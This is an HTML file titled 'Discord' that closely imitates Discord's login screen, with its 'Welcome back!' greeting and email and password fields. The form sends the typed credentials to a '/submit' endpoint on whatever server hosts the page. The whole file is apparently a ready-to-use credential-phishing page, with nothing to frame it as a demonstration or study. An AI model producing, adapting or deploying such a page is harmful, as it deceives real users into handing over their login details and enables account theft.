<!doctype html>
<html><head><meta charset="utf-8"><title>Discord</title>
<style>
html,body{height:100%;margin:0;background:#36393f;font-family:Whitney,sans-serif;}
.wrap{display:flex;align-items:center;justify-content:center;height:100%;}
.box{background:#36393f;padding:32px;border-radius:5px;width:420px;box-shadow:0 2px 10px rgba(0,0,0,.2);}
h2{color:#fff;text-align:center;margin:0 0 8px;}
p{color:#b9bbbe;text-align:center;margin:0 0 20px;}
label{display:block;color:#b9bbbe;font-size:12px;text-transform:uppercase;font-weight:600;margin-bottom:6px;}
input{width:100%;padding:10px;background:#303339;color:#dcddde;border:1px solid #222428;border-radius:3px;box-sizing:border-box;margin-bottom:16px;}
button{width:100%;padding:10px;background:#5865f2;color:#fff;border:none;border-radius:3px;cursor:pointer;font-weight:500;}
</style></head>
<body><div class="wrap"><div class="box">
<h2>Welcome back!</h2><p>We're so excited to see you again!</p>
<form method="POST" action="/submit">
<label>Email or Phone Number</label>
<input type="text" name="email" required autofocus>
<label>Password</label>
<input type="password" name="password" required>
<button type="submit">Log In</button>
</form></div></div></body></html>
